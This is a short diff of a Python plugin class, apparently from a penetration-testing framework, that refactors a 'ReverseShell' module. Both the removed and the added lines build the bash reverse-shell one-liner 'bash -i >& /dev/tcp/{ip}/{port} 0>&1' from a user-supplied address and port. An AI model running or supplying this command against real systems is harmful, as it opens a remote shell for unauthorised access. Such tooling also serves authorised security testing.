@@ -13,7 +13,7 @@ class ReverseShell(plugin.Module):
             help="Port address"
         )
         self.opts.description = "Generate reverse shell using bash"
-        self.shell = """bash -i >& /dev/tcp/{}/{} 0>&1"""
 
-    def show_shell(self, args):
-        print(self.shell.format(args.ip, args.port))
+    def make_shell(self):
+        self.shell = """bash -i >& /dev/tcp/{}/{} 0>&1""".format(self.args.ip, self.args.port)
+
